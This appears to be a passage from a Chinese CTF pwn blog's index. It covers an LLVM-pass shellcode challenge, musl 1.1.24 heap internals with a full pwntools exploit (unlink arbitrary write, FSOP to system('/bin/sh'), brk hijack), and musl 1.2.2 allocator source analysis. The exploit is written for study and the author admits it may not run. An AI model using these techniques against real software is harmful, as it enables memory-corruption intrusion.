std::stack&lt;int&gt;::stack&lt;std::deque&lt;int&gt;,void&gt;(v25);    std::stack&lt;llvm::Value *&gt;::push(v26, &amp;Operand);    v24 = 1;    std::stack&lt;int&gt;::push(v25, &amp;v24);    while ( *((_QWORD *)this + 5) &lt; v30 )    &#123;        if ( !std::stack&lt;llvm::Value *&gt;::size(v26) )        &#123;            `anonymous namespace&#x27;::MBAPass::writeRet(this);                break;        &#125;\n\n并且这里根据handle的处理可以看出来是将v30当作结束地址，再看一下比较重要的几个函数\n_anonymous_namespace_::MBAPass *__fastcall `anonymous namespace&#x27;::MBAPass::writeMovImm64(        _anonymous_namespace_::MBAPass *this,        int a2,        __int64 a3)&#123;  _anonymous_namespace_::MBAPass *result; // rax  **((_BYTE **)this + 5) = 0x48;  if ( a2 )    *(_BYTE *)(*((_QWORD *)this + 5) + 1LL) = 0xBB;  else    *(_BYTE *)(*((_QWORD *)this + 5) + 1LL) = 0xB8;  result = this;  *(_QWORD *)(*((_QWORD *)this + 5) + 2LL) = a3;  *((_QWORD *)this + 5) += 10LL;  return result;&#125;\n\n可以看到这里其实就是写shellcode\n&gt;&gt;&gt; test=b&#x27;\\x48\\xbb\\xfe\\xdc\\xba\\x98\\x76\\x54\\x32\\x10&#x27;&gt;&gt;&gt; disasm(test)&#x27;   0:   48 bb fe dc ba 98 76 54 32 10   movabs rbx, 0x1032547698badcfe&#x27;&gt;&gt;&gt;\n\n但是这里的漏洞点是在handle函数中将this[4]+0xff0当作了结束的位置，所以还存在0x10是我们可写的，所以我们通过借位的思想来书写shellcode\n在正常情况下执行：\n\n我们是可以顺利执行结束的\n那如果第二次我们的指令刚好到达0xff0执行完毕就会出现以下情况：\n\n 这里就会接着跳转回去，随后我们每次可控的内容只有八个字节，所以后续就是分片的思想通过jmp指令连接起我们的shellcode\n讲两句：这司马难度的shellcode确定是想我们比赛的时候来做吗？\nexp略长，需要的 https://github.com/196082/196082 自取\n\n参考链接：https://bbs.pediy.com/thread-273119.htm#msg_header_h1_3\n","categories":["pwn"],"tags":["llvm pass"]},{"title":"musl 1.1.24利用方式","url":"/2022/04/27/musl-1-1-24%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/","content":"这个月干的是属实有点儿少，感觉特别迷茫，学了那么多结果比赛还是一头雾水，虽然很烦躁但是还是不能放弃啊！\n在starCTF的第二道题我始终找不到漏洞点在哪，下来看wp才发现使用的libc不是普通的glibc了，其实在RCTF的一道题目就是基于musl的但是无奈github的仓库当中并没有题目的源码所以没去深入了解，在starCTF过后也算是了解一下这一相较于glic更为轻量的libc了。\n首先本文先介绍一下这一libc\nmusl 1.1.24musl libc 是一个专门为嵌入式系统开发的轻量级 libc 库，以简单、轻量和高效率为特色。有不少 Linux 发行版将其设为默认的 libc 库，用来代替体积臃肿的 glibc ，如 Alpine Linux（做过 Docker 镜像的应该很熟悉）、OpenWrt（常用于路由器）和 Gentoo 等。\n数据结构这一版本的chunk结构其实是和glibc相差不大的。\nstruct chunk &#123;    size_t psize, csize;     struct chunk *next, *prev;&#125;;\n\npsize和csize字段都有标志位（glibc 只有size字段有），但只有一种位于最低位的标志位INUSE（glibc 最低三位都有标志位）。若设置INUSE标志位（最低位为1），表示 chunk 正在被使用；若没有设置INUSE标志位（最低位为0），表示 chunk 已经被释放或者通过mmap分配的，需要通过psize的标志位来进一步判断 chunk 的状态。\nstatic struct &#123;    volatile uint64_t binmap;    struct bin bins[64];    volatile int free_lock[2];&#125; mal;\n\n这个mal结构体很类似main_arena，里面记录着堆的信息，有三个成员：64位无符号整数binmap、链表头部数组bins和锁free_lock。binmap记录每个 bin 是否为非空，若某个比特位为 1，表示对应的 bin 为非空，即 bin 链表中有 chunk。\nstruct bin &#123;    volatile int lock[2];    struct chunk *head;    struct chunk *tail;&#125;;\n\nbin 链表头部的结构如上。head和tail指针分别指向首部和尾部的 chunk，同时首部 chunk 的prev指针和尾部 chunk 的next指针指向 bin 链表头部，这样构成了循环链表。当链表为空时，head和tail指针等于 0 或者指向链表头部自身。\n看mal结构可以看到有64的bin，前面32个bin是类似于small bin的结构，存放的chunk的大小是固定的，但是后面的就类似于large bin存放的是在一定范围的chunk了。\nmalloc// src/malloc/malloc.c L284-L331void *malloc(size_t n)&#123;    struct chunk *c;    int i, j;    // 1. n 增加头部长度 OVERHEAD (0x10)，对齐 32 位：    // *n = (*n + OVERHEAD + SIZE_ALIGN - 1) &amp; SIZE_MASK;    if (adjust_size(&amp;n) &lt; 0) return 0;    // 若 n 到达 MMAP_THRESHOLD (0x38000)，使用 mmap chunk    if (n &gt; MMAP_THRESHOLD) &#123;        [...]        return CHUNK_TO_MEM(c);    &#125;    // 2. 计算 n 对应的 bin 下标 i    i = bin_index_up(n);    for (;;) &#123;        // 3. 查找 binmap        uint64_t mask = mal.binmap &amp; -(1ULL&lt;&lt;i);        // 若所有的可用 bin 均为空，调用 expand_heap 函数延展堆空间，生成新的 chunk        if (!mask) &#123;            c = expand_heap(n);            [...]            break;        &#125;        // 4. 获取大小最接近 n 的可用 bin 下标 j        j = first_set(mask);        lock_bin(j);        c = mal.bins[j].head; // c 是 bin j 链表首部的 chunk        // 5. 若符合条件，使用 pretrim 分割 c，否则使用 unbin 从链表中取出 c        if (c != BIN_TO_CHUNK(j)) &#123;            if (!pretrim(c, n, i, j)) unbin(c, j);            unlock_bin(j);            break;        unlock_bin(j);    &#125;    // 6. 回收 c 中大小超过 n 的部分    /* Now patch up in case we over-allocated */    trim(c, n);    return CHUNK_TO_MEM(c);&#125;\n\n大概步骤就是：\n\n调整n，增加头部的长度然后对齐32位\n\n如果n&gt;MMAP_THRESHOLD，则使用mmap创建一块大小为n的内存返回\n\n如果n&lt;=MMAP_THRESHOLD，计算n对应的bin的i，查找binmap\n​    如果所有可用bin都为空，那么就扩展堆空间，生存一个新的chunk\n​    如果存在非空的bin，则大小最接近n的bin，将bin首部的chunk返回\n​        如果符号pretrime条件，使用pretrime分割\n​        否则使用unbin从链表中取出\n​    最后对chunk进行trim，返回给用户\n\n\nstatic void unbin(struct chunk *c, int i)&#123;    // 若 bin 只有一个 chunk，将 bin 设为空 bin    if (c-&gt;prev == c-&gt;next)        a_and_64(&amp;mal.binmap, ~(1ULL&lt;&lt;i));    // 取出链表中的 chunk    c-&gt;prev-&gt;next = c-&gt;next;    c-&gt;next-&gt;prev = c-&gt;prev;    // 设置 INUSE 标志位    c-&gt;csize |= C_INUSE;    NEXT_CHUNK(c)-&gt;psize |= C_INUSE;&#125;\n\n这其实就是取出chunk的一个操作，可以看到取出的过程中并没有检测chunk指针的合法性，这也就造成了安全隐患\nstatic int pretrim(struct chunk *self, size_t n, int i, int j)&#123;    size_t n1;    struct chunk *next, *split;    // 条件 1: bin j 下标大于 40    /* We cannot pretrim if it would require re-binning. */    if (j &lt; 40) return 0;    // 条件 2: bin j 与 i 相隔 3 个 bin 或以上，    // 或者 j 等于 63 且 split 的大小大于 MMAP_THRESHOLD    if (j &lt; i+3) &#123;        if (j != 63) return 0;        n1 = CHUNK_SIZE(self);        if (n1-n &lt;= MMAP_THRESHOLD) return 0;    &#125; else &#123;        n1 = CHUNK_SIZE(self);    &#125;    // 条件 3: split 的大小属于 bin j 范围内，即 split 与 self 属于同一个 bin    if (bin_index(n1-n) != j) return 0;    // 切割出一块大小为 n 的 chunk    next = NEXT_CHUNK(self);    split = (void *)((char *)self + n);    split-&gt;prev = self-&gt;prev;    split-&gt;next = self-&gt;next;    split-&gt;prev-&gt;next = split;    split-&gt;next-&gt;prev = split;    split-&gt;psize = n | C_INUSE;    split-&gt;csize = n1-n;    next-&gt;psize = n1-n;    self-&gt;csize = n | C_INUSE;    return 1;&#125;\n\npretrim的作用是切割大 chunk，防止把大小超过需求的 chunk 分配给用户。当满足一定条件时，pretrim从 bin 链表首部 chunk 切割出一块大小刚好符合需求的小 chunk，然后将小 chunk 分配给用户，链表首部 chunk 的位置保持不变。\nstatic void trim(struct chunk *self, size_t n)&#123;    size_t n1 = CHUNK_SIZE(self);    struct chunk *next, *split;    // 条件：self 的大小 n1 多于 n DONTCARE (0x10) 字节    if (n &gt;= n1 - DONTCARE) return;    // 将 self 的大小切割为 n，剩余部分成为新的 chunk split    next = NEXT_CHUNK(self);    split = (void *)((char *)self + n);    split-&gt;psize = n | C_INUSE;    split-&gt;csize = n1-n | C_INUSE;    next-&gt;psize = n1-n | C_INUSE;    self-&gt;csize = n | C_INUSE;    // 将 split 释放到 bin    __bin_chunk(split);&#125;\n\nmalloc 的最后一步是trim，主要作用是回收 chunk 超过需求大小的部分。trim将 chunk 多余的部分切割出来，然后将其释放到 bin 中，减少内存浪费。\nfreevoid free(void *p)&#123;    if (!p) return;    struct chunk *self = MEM_TO_CHUNK(p);    // 若 csize 没有设置 INUSE 标志位，检查是否为 mmap chunk 或者 double free    // #define IS_MMAPPED(c) !((c)-&gt;csize &amp; (C_INUSE))    if (IS_MMAPPED(self))        unmap_chunk(self);    else        __bin_chunk(self);&#125;\n\nstatic void unmap_chunk(struct chunk *self)&#123;    size_t extra = self-&gt;psize;    char *base = (char *)self - extra;    size_t len = CHUNK_SIZE(self) + extra;    // 若 prev size 设置了 INUSE 标志位，视为 double free，crash    /* Crash on double free */    if (extra &amp; 1) a_crash();    __munmap(base, len);&#125;\n\nfree 先对 chunk 进行 mmap / double free 检查。如果 chunk 的csize字段没有设置INUSE标志位，进入unmap_chunk函数检查psize字段。如果psize字段设置了INUSE标志位，视为 double free，crash；否则视为 mmap chunk，调用__munmap函数释放。\nvoid __bin_chunk(struct chunk *self)&#123;    struct chunk *next = NEXT_CHUNK(self);    size_t final_size, new_size, size;    int reclaim=0;    int i;    // new_size 是 self 原来的大小，final_size 是 self 合并空闲 chunk 后的大小    final_size = new_size = CHUNK_SIZE(self);    // 若下一个 chunk 的 psize 不等于 self 的 csize，则 crash    /* Crash on corrupted footer (likely from buffer overflow) */    if (next-&gt;psize != self-&gt;csize) a_crash();    // 1. 检查 self 前后是否有空闲 chunk    for (;;) &#123;        if (self-&gt;psize &amp; next-&gt;csize &amp; C_INUSE) &#123;            // 去除 INUSE 标志位            self-&gt;csize = final_size | C_INUSE;            next-&gt;psize = final_size | C_INUSE;            // 计算 final_size 对应的 bin 下标 i            i = bin_index(final_size);            lock_bin(i);            lock(mal.free_lock);            if (self-&gt;psize &amp; next-&gt;csize &amp; C_INUSE)                break;  // 退出循环            unlock(mal.free_lock);            unlock_bin(i);        &#125;        // 向前合并空闲 chunk        if (alloc_rev(self)) &#123;  // 从 bin 链表取出待合并的空闲 chunk            self = PREV_CHUNK(self);            size = CHUNK_SIZE(self);            final_size += size;            if (new_size+size &gt; RECLAIM &amp;&amp; (new_size+size^size) &gt; size)                reclaim = 1;        &#125;        // 向后合并空闲 chunk        if (alloc_fwd(next)) &#123;  // 从 bin 链表取出待合并的空闲 chunk            size = CHUNK_SIZE(next);            final_size += size;            if (new_size+size &gt; RECLAIM &amp;&amp; (new_size+size^size) &gt; size)                reclaim = 1;            next = NEXT_CHUNK(next);        &#125;    &#125;    //2. 在 binmap 中，将 bin i 设为非空 bin    if (!(mal.binmap &amp; 1ULL&lt;&lt;i))        a_or_64(&amp;mal.binmap, 1ULL&lt;&lt;i);    self-&gt;csize = final_size;    next-&gt;psize = final_size;    unlock(mal.free_lock);    // 3. 将 self 加入到 bin i 链表的尾部    self-&gt;next = BIN_TO_CHUNK(i);    self-&gt;prev = mal.bins[i].tail;    self-&gt;next-&gt;prev = self;    self-&gt;prev-&gt;next = self;    /* Replace middle of large chunks with fresh zero pages */    if (reclaim) &#123;        [...]    &#125;    unlock_bin(i);&#125;\n\n__bin_chunk函数的作用是将 chunk 插入到 bin 链表中。首先合并 chunk 前后的空闲 chunk、设置 binmap 和 chunk 标志位，最后将 chunk 插入到对应的 bin 链表中。\n然后在musl当中的堆管理为了减少内存的使用会直接将libc和程序当中的空闲的内存当作堆内存，而glibc的堆地址一般都是位于内存中的动态内存区域。\nXCTF_2020_PWN_musl\n可以看到这里确实是直接在libc和process上面有堆的地址。\n题目分析就是很经典的菜单题，并且在create函数里面有一处只能运行一次的0x50的溢出，而且题目只有一处使用exit退出程序，然后show函数也只有一次。\n利用分析其实利用思路就很简单了，存在溢出，unbin又有如此大的安全隐患，所以就是通过溢出修改掉next指针和prev指针从而实现任意地址写，造成FSOP\n这里说一下怎么造成的FSOP\n_Noreturn void exit(int code)&#123;\t__funcs_on_exit();\t__libc_exit_fini();\t__stdio_exit();\t_Exit(code);&#125;\n\nstatic void close_file(FILE *f)&#123;\tif (!f) return;\tFFINALLOCK(f);\tif (f-&gt;wpos != f-&gt;wbase) f-&gt;write(f, 0, 0);\tif (f-&gt;rpos != f-&gt;rend) f-&gt;seek(f, f-&gt;rpos-f-&gt;rend, SEEK_CUR);&#125;void __stdio_exit(void)&#123;\tFILE *f;\tfor (f=*__ofl_lock(); f; f=f-&gt;next) close_file(f);\tclose_file(__stdin_used);\tclose_file(__stdout_used);\tclose_file(__stderr_used);&#125;\n\n可以看到最后是有机会调用到file的内部函数指针的\nstruct _IO_FILE &#123;\tunsigned flags;\tunsigned char *rpos, *rend;\tint (*close)(FILE *);\tunsigned char *wend, *wpos;\tunsigned char *mustbezero_1;\tunsigned char *wbase;\tsize_t (*read)(FILE *, unsigned char *, size_t);\tsize_t (*write)(FILE *, const unsigned char *, size_t);\toff_t (*seek)(FILE *, off_t, int);\tunsigned char *buf;\tsize_t buf_size;\tFILE *prev, *next;\tint fd;\tint pipe_pid;\tlong lockcount;\tint mode;\tvolatile int lock;\tint lbf;\tvoid *cookie;\toff_t off;\tchar *getln_buf;\tvoid *mustbezero_2;\tunsigned char *shend;\toff_t shlim, shcnt;\tFILE *prev_locked, *next_locked;\tstruct __locale_struct *locale;&#125;;\n\n所以我们需要利用exit来执行FSOP，不过难点就是怎么运行到exit，因为需要malloc返回一个0xdeadbeef，在上面可以看到，如果所有的bin都为空，此时malloc就会调用expand_heap来扩展堆，本质还是调用了__expand_heap函数\nvoid *__expand_heap(size_t *pn)&#123;\tstatic uintptr_t brk;\tstatic unsigned mmap_step;\tsize_t n = *pn;\tif (n &gt; SIZE_MAX/2 - PAGE_SIZE) &#123;\t\terrno = ENOMEM;\t\treturn 0;\t&#125;\tn += -n &amp; PAGE_SIZE-1;\tif (!brk) &#123;\t\tbrk = __syscall(SYS_brk, 0);\t\tbrk += -brk &amp; PAGE_SIZE-1;\t&#125;\tif (n &lt; SIZE_MAX-brk &amp;&amp; !traverses_stack_p(brk, brk+n)\t    &amp;&amp; __syscall(SYS_brk, brk+n)==brk+n) &#123;\t\t*pn = n;\t\tbrk += n;\t\treturn (void *)(brk-n);\t&#125;\tsize_t min = (size_t)PAGE_SIZE &lt;&lt; mmap_step/2;\tif (n &lt; min) n = min;\tvoid *area = __mmap(0, n, PROT_READ|PROT_WRITE,\t\tMAP_PRIVATE|MAP_ANONYMOUS, -1, 0);\tif (area == MAP_FAILED) return 0;\t*pn = n;\tmmap_step++;\treturn area;&#125;\n\n在__expand_heap函数中，brk是指向数据段末尾位置的指针。__expand_heap函数调用 brk 系统调用__syscall(SYS_brk, brk+n)，将数据段末尾向后延展n字节，然后延展部分返回给malloc作为新的 chunk 分配给用户\n若程序不开启 PIE，数据段的地址长度为 24 bit（0~0x2000000），内存位置与0xBADBEEF比较接近。若将brk指针修改为0xBADBEEF - n，brk 系统调用就会把数据段延展至0xBADBEEF，使其成为可访问的内存地址。\nexpfrom pwn import *elf = ELF(&#x27;./carbon&#x27;)# r = process([&#x27;./libc.so&#x27;, &#x27;carbon&#x27;])# libc = ELF(&#x27;./libc.so&#x27;)# r = process([&#x27;/ctf/work/download/libc.so&#x27;, &#x27;./carbon&#x27;])# libc = ELF(&#x27;/ctf/work/download/libc.so&#x27;)r = process([&#x27;../../libc/libc1.1.24.so&#x27;, &#x27;./carbon&#x27;])libc = ELF(&#x27;../../libc/libc1.1.24.so&#x27;)context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]def menu(option):    r.recvuntil(b&#x27;&gt; &#x27;)    r.sendline(bytes(str(option), encoding=&#x27;utf8&#x27;))def create(size, believer, content):    menu(1)    r.recvuntil(b&#x27;What is your prefer size? &gt;&#x27;)    r.sendline(bytes(str(size), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&#x27;Are you a believer? &gt;&#x27;)    r.sendline(believer)    r.recvuntil(b&#x27;Say hello to your new sleeve &gt;&#x27;)    r.send(content)def delete(idx):    menu(2)    r.recvuntil(b&#x27;What is your sleeve ID? &gt;&#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf8&#x27;))def edit(idx, content):    menu(3)    r.recvuntil(b&#x27;What is your sleeve ID? &gt;&#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf8&#x27;))    r.send(content)def show(idx):    menu(4)    r.recvuntil(b&#x27;What is your sleeve ID? &gt;&#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf8&#x27;))context.log_level = &#x27;debug&#x27;context.arch = &#x27;amd64&#x27;create(0x1, b&#x27;N&#x27;, b&#x27;a&#x27;)show(0)libc_base = u64(r.recvuntil(b&#x27;Done.&#x27;, drop=True).ljust(8, b&#x27;\\x00&#x27;)) - 0x29de61print(&#x27;libc_base=&gt;&#x27;, hex(libc_base))bin_addr = libc_base + 0x29de00 - 0x8stdin_addr = libc_base + libc.symbols[&#x27;__stdin_FILE&#x27;]system_addr = libc_base + libc.symbols[&#x27;system&#x27;]binmap_addr = libc_base + 0x29da80brk_addr = libc_base + libc.symbols[&#x27;brk&#x27;]create(0x10, b&#x27;N&#x27;, b&#x27;a&#x27; * 0x10)  # 1create(0x10, b&#x27;N&#x27;, b&#x27;a&#x27; * 0x10)  # 2create(0x10, b&#x27;N&#x27;, b&#x27;a&#x27; * 0x10)  # 3create(0x10, b&#x27;N&#x27;, b&#x27;a&#x27; * 0x10)  # 4create(0x10, b&#x27;N&#x27;, b&#x27;a&#x27; * 0x10)  # 5create(0x10, b&#x27;N&#x27;, b&#x27;a&#x27; * 0x10)  # 6create(0x10, b&#x27;N&#x27;, b&#x27;a&#x27; * 0x10)  # 7create(0x10, b&#x27;N&#x27;, b&#x27;a&#x27; * 0x10)  # 8delete(1)delete(3)payload = b&#x27;a&#x27; * 0x10payload += p64(0x21) + p64(0x21) + b&#x27;a&#x27; * 0x10payload += p64(0x21) + p64(0x20) + p64(stdin_addr -                                       0x10) + p64(stdin_addr -                                                   0x10) + p8(0x20)create(0x10, b&#x27;Y&#x27;, payload + b&#x27;\\n&#x27;)  # 1create(0x10, b&#x27;N&#x27;, b&#x27;a&#x27; * 0x10)  # 3delete(5)edit(3, flat(stdin_addr - 0x10, bin_addr))create(0x10, b&#x27;N&#x27;, b&#x27;a&#x27; * 0x10)  # 5file_struct = b&#x27;/bin/sh\\x00&#x27; + b&#x27;a&#x27; * 0x20file_struct += p64(0) * 2 + p64(1) * 2 + p64(system_addr)create(0x50, b&#x27;N&#x27;, b&#x27;\\n&#x27;)  # 9delete(7)edit(3, flat(brk_addr - 0x10, brk_addr - 0x10))create(0x10, b&#x27;N&#x27;, b&#x27;a&#x27; * 0x10)  # 7delete(1)edit(3, flat(binmap_addr - 0x10, binmap_addr - 0x10))create(0x10, b&#x27;N&#x27;, b&#x27;a&#x27; * 0x10)  # 1delete(7)edit(3, flat(binmap_addr - 0x10, bin_addr))create(0x10, b&#x27;N&#x27;, b&#x27;a&#x27; * 0x10)  # 7create(0x50, b&#x27;N&#x27;, b&#x27;\\n&#x27;)  # 10delete(1)edit(3, flat(brk_addr - 0x10, bin_addr))create(0x10, b&#x27;N&#x27;, b&#x27;a&#x27; * 0x10)  # 1create(0x50, b&#x27;N&#x27;, b&#x27;\\n&#x27;)  # 11edit(9, file_struct)edit(11, p64(0xbadbeef - 0x20) + b&#x27;\\n&#x27;)edit(10, b&#x27;a&#x27; * 0x10 + p64(0) + b&#x27;\\n&#x27;)r.recvuntil(b&quot;&gt;&quot;)r.sendlien(b&#x27;1&#x27;)r.recvuntil(b&#x27;What is your prefer size? &gt;&#x27;)r.sendline(b&#x27;0&#x27;)r.interactive()\n\n然后就是我这里的libc是自己编译的和题目一直有出入，所以我这个exp可能不能直接用在题目上，同时我也问了其他师傅这个编译该怎么办，还在等回复~\n\n参考链接：https://www.anquanke.com/post/id/202253%23h2-4#h3-14\n","categories":["pwn"],"tags":["musl"]},{"title":"musl1.2.2源码分析+starCTF-BabyNote复现","url":"/2022/05/10/musl1-2-2%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-starCTF-BabyNote%E5%A4%8D%E7%8E%B0/","content":"源码分析数据结构这里根据我参考的文章来进行分析，chunk-&gt;group-&gt;mate\nchunk这里其实是没有定义chunk这个结构的，不过根据效果可以推断出来\nchunk关于0x10字节对其，如果是group中的第一个chunk，p的前0x10字节作为group结构体的头部，包括meta地址等。如果不是第一个chunk，只有前4字节作为元数据，包括了idx和offset，用来计算与该chunk与group地址的偏移。如果该chunk被释放，idx会被写为0xff，offset为0。idx和offset的作用就是free时根据chunk地址找到该group对应meta的地址，也为漏洞利用做了铺垫。\nstruct chunk&#123; char prev_user_data[];    uint8_t idx;  //低5bit为idx第几个chunk    uint16_t offset; //与第一个chunk起始地址的偏移，实际地址偏移为offset * UNIT    char data[];&#125;;\n\ngroup在musl中一个meta管理的内存区域用group表示，一个meta对应一个group。group中存放size相同的相邻chunk，通过idx和offset索引。\nstruct group &#123;    struct meta *meta;// meta的地址    unsigned char active_idx:5;    char pad[UNIT - sizeof(struct meta *) - 1];// 保证0x10字节对齐    unsigned char storage[];# chunk&#125;;\n\n通过chunk获取group地址\nstatic inline struct meta *get_meta(const unsigned char *p)&#123;    assert(!((uintptr_t)p &amp; 15));    int offset = *(const uint16_t *)(p - 2);    int index = get_slot_index(p);    if (p[-4]) &#123;        assert(!offset);        offset = *(uint32_t *)(p - 8);        assert(offset &gt; 0xffff);    &#125;    const struct group *base = (const void *)(p - UNIT*offset - UNIT);  ... ...&#125;\n\n最终就是：\ngroup_addr = chunk_addr - 0x10 * offset - 0x10\n\nmetastruct meta &#123;    struct meta *prev, *next;//双向链表    struct group *mem;// 这里指向管理的group 地址    volatile int avail_mask, freed_mask;    uintptr_t last_idx:5; //group中chunk数    uintptr_t freeable:1;    uintptr_t sizeclass:6; //管理group大小    uintptr_t maplen:8*sizeof(uintptr_t)-12;&#125;;\n\n其中如果这个meta 前后都没有，那么它的prev next 就指向它自己\navail_mask和freed_mask以bitmap方式表示group中chunk的状态\nmeta_arenastruct meta_area &#123;    uint64_t check;    struct meta_area *next;    int nslots;    struct meta slots[];&#125;;\n\n在内存页起始地址，是多个meta的集合，这样是为了meta &amp; 0xffffffffffff000就能找到meta_arena结构体。\n结构体中比较重要的就是check，Musl为了保证meta不被伪造，会验证meta_arena中的check是否与malloc_context中的secret相等。\nmalloc_contextstruct malloc_context &#123;    uint64_t secret;//也就是用于和meta_area验证的值#ifndef PAGESIZE    size_t pagesize;#endif    int init_done;    unsigned mmap_counter;    struct meta *free_meta_head;//释放的meta    struct meta *avail_meta;//可用分配的meta    size_t avail_meta_count, avail_meta_area_count, meta_alloc_shift;    struct meta_area *meta_area_head, *meta_area_tail;    unsigned char *avail_meta_areas;    struct meta *active[48];//可以分配的meta地址，idx与size相关    size_t usage_by_class[48];//所有meta的group管理chunk数量    uint8_t unmap_seq[32], bounces[32];    uint8_t seq;    uintptr_t brk;&#125;;\n\nmalloc和free的源码分析mallocvoid *malloc(size_t n)&#123;\tif (size_overflows(n)) return 0;\tstruct meta *g;\tuint32_t mask, first;\tint sc;\tint idx;\tint ctr;\tif (n &gt;= MMAP_THRESHOLD) &#123;\t\tsize_t needed = n + IB + UNIT;\t\tvoid *p = mmap(0, needed, PROT_READ|PROT_WRITE,\t\t\tMAP_PRIVATE|MAP_ANON, -1, 0);\t\tif (p==MAP_FAILED) return 0;\t\twrlock();\t\tstep_seq();\t\tg = alloc_meta();\t\tif (!g) &#123;\t\t\tunlock();\t\t\tmunmap(p, needed);\t\t\treturn 0;\t\t&#125;\t\tg-&gt;mem = p;\t\tg-&gt;mem-&gt;meta = g;\t\tg-&gt;last_idx = 0;\t\tg-&gt;freeable = 1;\t\tg-&gt;sizeclass = 63;\t\tg-&gt;maplen = (needed+4095)/4096;\t\tg-&gt;avail_mask = g-&gt;freed_mask = 0;\t\t// use a global counter to cycle offset in\t\t// individually-mmapped allocations.\t\tctx.mmap_counter++;\t\tidx = 0;\t\tgoto success;\t&#125;// 这上面就是验证是否超过最大size以及是否使用mmap进行申请空间\tsc = size_to_class(n);// 将size转化成对应的size_classes的下标\trdlock();\tg = ctx.active[sc];// 取出对应sc的meta\t// use coarse size classes initially when there are not yet\t// any groups of desired size. this allows counts of 2 or 3\t// to be allocated at first rather than having to start with\t// 7 or 5, the min counts for even size classes.    // 没找到对应的meta 会执行下面的if语句\tif (!g &amp;&amp; sc&gt;=4 &amp;&amp; sc&lt;32 &amp;&amp; sc!=6 &amp;&amp; !(sc&amp;1) &amp;&amp; !ctx.usage_by_class[sc]) &#123;\t\tsize_t usage = ctx.usage_by_class[sc|1];\t\t// if a new group may be allocated, count it toward\t\t// usage in deciding if we can use coarse class.\t\tif (!ctx.active[sc|1] || (!ctx.active[sc|1]-&gt;avail_mask\t\t    &amp;&amp; !ctx.active[sc|1]-&gt;freed_mask))\t\t\tusage += 3;\t\tif (usage &lt;= 12)\t\t\tsc |= 1;\t\tg = ctx.active[sc];\t&#125;\tfor (;;) &#123;// 寻找对应size的maeta的group可用的chunk\t\tmask = g ? g-&gt;avail_mask : 0;\t\tfirst = mask&amp;-mask;\t\tif (!first) break;\t\tif (RDLOCK_IS_EXCLUSIVE || !MT)\t\t\tg-&gt;avail_mask = mask-first;\t\telse if (a_cas(&amp;g-&gt;avail_mask, mask, mask-first)!=mask)\t\t\tcontinue;\t\tidx = a_ctz_32(first);\t\tgoto success;\t&#125;\tupgradelock();\tidx = alloc_slot(sc, n);// 使用alloc_slot寻找idx\tif (idx &lt; 0) &#123;\t\tunlock();\t\treturn 0;\t&#125;\tg = ctx.active[sc];success:\tctr = ctx.mmap_counter;\tunlock();\treturn enframe(g, idx, n, ctr);// 取出chunk&#125;\n\n下面总结一下：\n 1. 首先是判断size，是否超过限制，或者是否超过阀值\n 2. 若是size没有超过阀值，则会在active里找对应size的meta\n 3. 如果active对应size的meta 位置上为空，没找到那么尝试先找size更大的meta\n 4. 如果active对应size的meta位置上有对应的meta，尝试从这个meta中的group找到可用的chunk\n 5. 如果有空闲的chunk，就直接修改meta-&gt;avail_mask，然后利用enframe(g, idx, n, ctr);\n 6. 从对应meta 中的group 取出 第idx号chunk分配\n 7. 如果没有，break 跳出循环\n 8. 跳出循环后执行`idx = alloc_slot(sc, n);`\n     1. 使用group中被free的chunk\n     2. 从队列中其他meta的group 中找\n     3. 如果都不行就重新分配一个新的group 对应一个新的meta\n 9. enframe(g, idx, n, ctr) 取出 对应meta 中对应idx 的chunk\n\nfreevoid free(void *p)&#123;\tif (!p) return;\tstruct meta *g = get_meta(p);// 得到chunk对应的meta\tint idx = get_slot_index(p);// 得到idx\tsize_t stride = get_stride(g);// 找到size_classes中对应chunk的size\tunsigned char *start = g-&gt;mem-&gt;storage + stride*idx;\tunsigned char *end = start + stride - IB;\tget_nominal_size(p, end);// 算出chunk的真实大小\tuint32_t self = 1u&lt;&lt;idx, all = (2u&lt;&lt;g-&gt;last_idx)-1;\t((unsigned char *)p)[-3] = 255;\t// invalidate offset to group header, and cycle offset of\t// used region within slot if current offset is zero.\t*(uint16_t *)((char *)p-2) = 0;\t// release any whole pages contained in the slot to be freed\t// unless it&#x27;s a single-slot group that will be unmapped.\tif (((uintptr_t)(start-1) ^ (uintptr_t)end) &gt;= 2*PGSZ &amp;&amp; g-&gt;last_idx) &#123;\t\tunsigned char *base = start + (-(uintptr_t)start &amp; (PGSZ-1));\t\tsize_t len = (end-base) &amp; -PGSZ;\t\tif (len) madvise(base, len, MADV_FREE);\t&#125;\t// atomic free without locking if this is neither first or last slot\tfor (;;) &#123;\t\tuint32_t freed = g-&gt;freed_mask;\t\tuint32_t avail = g-&gt;avail_mask;\t\tuint32_t mask = freed | avail; // 将free的chunk加进去\t\tassert(!(mask&amp;self));\t\tif (!freed || mask+self==all) break;\t\tif (!MT)\t\t\tg-&gt;freed_mask = freed+self;\t\telse if (a_cas(&amp;g-&gt;freed_mask, freed, freed+self)!=freed)\t\t\tcontinue;\t\treturn;\t&#125;\twrlock();\tstruct mapinfo mi = nontrivial_free(g, idx);\tunlock();\tif (mi.len) munmap(mi.base, mi.len);&#125;\n\n总结一下：\n 1. 通过get_meta(p)得到meta，通过get_slot_index(p)得到对应chunk的 idx -&gt; 通过get_nominal_size(p, end) 算出真实大小\n 2. 重置idx 和 offset idx 被置为0xff 标记chunk， 修改freed_mask 标记chunk被释放\n 3. 最后调用nontrivial_free 完成关于meta一些剩余操作\n\n\n仔细观察分配的过程，我们也可以看出为什么free 的chunk不能立即回收使用，因为有空闲的chunk的时候，分配chunk是直接设置meta-&gt;avail_mask\n然后直接enframe() 直接从group中取出 chunk即可，不会设置meta-&gt;freed\n\nstatic inline struct meta *get_meta(const unsigned char *p)&#123;\tassert(!((uintptr_t)p &amp; 15));\tint offset = *(const uint16_t *)(p - 2);\tint index = get_slot_index(p);\tif (p[-4]) &#123;\t\tassert(!offset);\t\toffset = *(uint32_t *)(p - 8);\t\tassert(offset &gt; 0xffff);\t&#125;\tconst struct group *base = (const void *)(p - UNIT*offset - UNIT);// 通过offset 和chunk 地址计算出group地址\tconst struct meta *meta = base-&gt;meta;// 得到meta地址\tassert(meta-&gt;mem == base);// 检查meta 